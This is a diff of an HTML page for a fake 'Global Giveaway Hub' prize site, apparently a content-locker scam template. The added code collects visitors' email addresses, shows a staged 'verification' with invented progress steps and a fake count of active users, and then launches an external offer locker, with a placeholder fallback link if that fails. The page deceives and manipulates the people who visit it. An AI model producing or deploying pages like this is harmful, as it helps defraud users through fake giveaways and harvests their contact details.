@@ -3,91 +3,142 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Global Rewards | 2026 Invitational</title>
+    
+    <meta name="mylead-verification" content="YOUR_CODE_HERE">
+
+    <title>Global Giveaway Hub | Secure Portal</title>
+    
+    <script src="https://your-locker-link.com/js/"></script>
+
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
-        body { font-family: 'Inter', sans-serif; }
-        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(10px); }
-        .hero-glow { background: radial-gradient(circle at 50% -20%, #2563eb 0%, #0f172a 100%); }
+        body { 
+            background-color: #08080c; 
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+            background-image: linear-gradient(to bottom, rgba(8, 8, 12, 0.8), rgba(8, 8, 12, 0.9)), url('https://your-project.vercel.app/hub-bg.jpg');
+            background-size: cover;
+            background-attachment: fixed;
+        }
+        .glass-panel { 
+            background: rgba(255, 255, 255, 0.03); 
+            border: 1px solid rgba(255, 255, 255, 0.1); 
+            backdrop-filter: blur(20px); 
+            -webkit-backdrop-filter: blur(20px);
+        }
+        .btn-universal { 
+            background: linear-gradient(135deg, #10b981, #0ea5e9); 
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); 
+        }
+        .btn-universal:hover { 
+            transform: translateY(-2px); 
+            box-shadow: 0 10px 25px rgba(16, 185, 129, 0.3); 
+            filter: brightness(1.1);
+        }
+        .loading-spinner {
+            border: 3px solid rgba(255, 255, 255, 0.1);
+            border-top: 3px solid #10b981;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
-<body class="bg-[#0f172a] text-white min-h-screen flex items-center justify-center p-4 hero-glow">
+<body class="text-white flex items-center justify-center min-h-screen p-4">
 
-    <div class="max-w-2xl w-full">
-        <div class="text-center mb-8">
-            <div class="inline-block px-4 py-1.5 rounded-full border border-blue-500/30 bg-blue-500/10 text-blue-400 text-[10px] font-black uppercase tracking-[0.3em] mb-4">
-                Verified Global Distribution
-            </div>
-            <h1 class="text-4xl md:text-6xl font-black tracking-tighter mb-4 leading-none">
-                2026 REWARD <br><span class="text-blue-500 text-shadow-lg">INVITATIONAL</span>
-            </h1>
-            <p class="text-slate-400 text-lg md:text-xl font-medium max-w-lg mx-auto leading-relaxed">
-                Join the exclusive 2026 distribution pool. Select participants are eligible for regional electronic and credit rewards.
-            </p>
-        </div>
+    <div id="main-container" class="max-w-md w-full glass-panel rounded-[2.5rem] p-8 md:p-10 shadow-2xl relative overflow-hidden">
+        
+        <div class="absolute -top-24 -right-24 w-48 h-48 bg-emerald-500/10 rounded-full blur-3xl"></div>
 
-        <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
-            <div class="glass p-6 rounded-3xl border border-white/10 text-center">
-                <div class="text-blue-500 font-black text-2xl mb-1">$50k+</div>
-                <div class="text-slate-500 text-[10px] uppercase font-bold tracking-widest">Prize Pool</div>
-            </div>
-            <div class="glass p-6 rounded-3xl border border-white/10 text-center">
-                <div class="text-blue-500 font-black text-2xl mb-1">GLOBAL</div>
-                <div class="text-slate-500 text-[10px] uppercase font-bold tracking-widest">Availability</div>
-            </div>
-            <div class="glass p-6 rounded-3xl border border-white/10 text-center">
-                <div class="text-blue-500 font-black text-2xl mb-1">24H</div>
-                <div class="text-slate-500 text-[10px] uppercase font-bold tracking-widest">Time Limit</div>
-            </div>
-        </div>
-
-        <div class="bg-white rounded-[3rem] p-4 md:p-10 shadow-2xl shadow-blue-500/20">
-            <div class="text-center mb-6">
-                <h3 class="text-slate-900 text-xl font-black uppercase tracking-tight">Ready to participate?</h3>
-                <p class="text-slate-500 text-sm mt-1">Click below to check your regional eligibility status.</p>
-            </div>
-
-            <button id="auth-trigger" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-black py-6 rounded-[2rem] shadow-xl shadow-blue-300 transition-all active:scale-[0.98] flex items-center justify-center group uppercase tracking-widest text-lg">
-                <span>ENTER GIVEAWAY</span>
-                <svg class="w-6 h-6 ml-3 group-hover:translate-x-2 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M13 7l5 5m0 0l-5 5m5-5H6"></path>
-                </svg>
-            </button>
-
-            <div class="mt-8 flex items-center justify-between px-4 border-t border-slate-100 pt-6">
-                <div class="flex items-center gap-2">
-                    <span class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
-                    <span class="text-[10px] text-slate-400 font-bold uppercase tracking-tighter">System Online</span>
+        <div id="step-1" class="relative z-10">
+            <div class="flex flex-col items-center text-center mb-10">
+                <div class="w-20 h-20 bg-white/5 rounded-3xl flex items-center justify-center mb-4 border border-white/10">
+                    <span class="text-4xl">🌐</span>
                 </div>
-                <span id="session-id" class="text-[10px] text-slate-400 font-mono italic"></span>
+                <h1 class="text-2xl font-black italic tracking-tighter uppercase">GLOBAL<span class="text-emerald-400">HUB</span></h1>
+                <p class="text-slate-500 text-[9px] font-bold tracking-[0.4em] uppercase mt-1">International Prize Verification</p>
+            </div>
+
+            <div class="bg-white/5 rounded-2xl p-4 mb-8 border border-white/5 flex items-center gap-4">
+                <div class="flex -space-x-2">
+                    <div class="w-6 h-6 rounded-full bg-slate-700 border border-slate-800"></div>
+                    <div class="w-6 h-6 rounded-full bg-slate-600 border border-slate-800"></div>
+                </div>
+                <p class="text-slate-300 text-[11px] font-medium">
+                    <span class="text-emerald-400 font-bold">142 users</span> currently verifying in your region.
+                </p>
+            </div>
+
+            <form id="verification-form" class="space-y-4">
+                <div>
+                    <label class="text-[10px] font-black text-slate-500 uppercase tracking-widest ml-1">Account Identifier</label>
+                    <input type="email" id="email-input" placeholder="Enter email address..." required 
+                        class="w-full mt-2 px-5 py-4 bg-black/40 border border-white/10 text-white rounded-2xl focus:border-emerald-500 outline-none transition-all placeholder:text-slate-600">
+                </div>
+
+                <button type="submit" class="w-full btn-universal text-white font-black py-5 rounded-2xl shadow-xl uppercase tracking-widest text-sm active:scale-95">
+                    Start Verification
+                </button>
+            </form>
+        </div>
+
+        <div id="step-2" class="hidden relative z-10 py-12 text-center">
+            <div class="loading-spinner mx-auto mb-8"></div>
+            <h2 class="text-lg font-bold uppercase italic tracking-tight">Syncing with Server...</h2>
+            <div class="mt-4 space-y-2">
+                <p id="status-text" class="text-emerald-400 text-xs font-mono font-bold uppercase tracking-wider">Establishing Connection</p>
+                <div class="w-full bg-white/5 h-1 rounded-full overflow-hidden">
+                    <div id="progress-bar" class="bg-emerald-500 h-full w-0 transition-all duration-500"></div>
+                </div>
             </div>
         </div>
 
-        <p class="text-center text-slate-500 text-[10px] mt-8 uppercase tracking-[0.2em] font-medium">
-            &copy; 2026 Global Distribution Partners. All Rights Reserved.
-        </p>
     </div>
 
     <script>
-        // Generate a unique session ID
-        document.getElementById('session-id').innerText = "SID-" + Math.random().toString(36).substring(2, 8).toUpperCase();
+        const form = document.getElementById('verification-form');
+        const step1 = document.getElementById('step-1');
+        const step2 = document.getElementById('step-2');
+        const statusText = document.getElementById('status-text');
+        const progressBar = document.getElementById('progress-bar');
 
-        document.getElementById('auth-trigger').onclick = function() {
-            const btn = this;
+        form.onsubmit = function(e) {
+            e.preventDefault();
             
-            // UI Feedback
-            btn.innerHTML = '<span class="animate-pulse italic">SYNCING...</span>';
-            btn.style.opacity = "0.8";
-
-            // The main path
-            const gateway_point = "https://confirmapp.store/sl/o19lr";
-
-            // Short delay to allow animation to show
+            // UI Transition
+            step1.classList.add('opacity-0');
             setTimeout(() => {
-                window.location.replace(gateway_point);
+                step1.classList.add('hidden');
+                step2.classList.remove('hidden');
+                startSimulation();
             }, 300);
         };
+
+        function startSimulation() {
+            const steps = [
+                { t: "Scanning Regional IP...", p: "30%" },
+                { t: "Fetching Prize Allocation...", p: "60%" },
+                { t: "Finalizing Security Handshake...", p: "90%" }
+            ];
+
+            steps.forEach((step, index) => {
+                setTimeout(() => {
+                    statusText.innerText = step.t;
+                    progressBar.style.width = step.p;
+                }, (index + 1) * 800);
+            });
+
+            // TRIGGER LOCKER
+            setTimeout(() => {
+                if (typeof og_load === "function") {
+                    og_load(); 
+                } else {
+                    // Fallback to direct link if script fails
+                    window.location.href = "https://your-direct-locker-link.com";
+                }
+            }, 3200);
+        }
     </script>
 </body>
 </html>
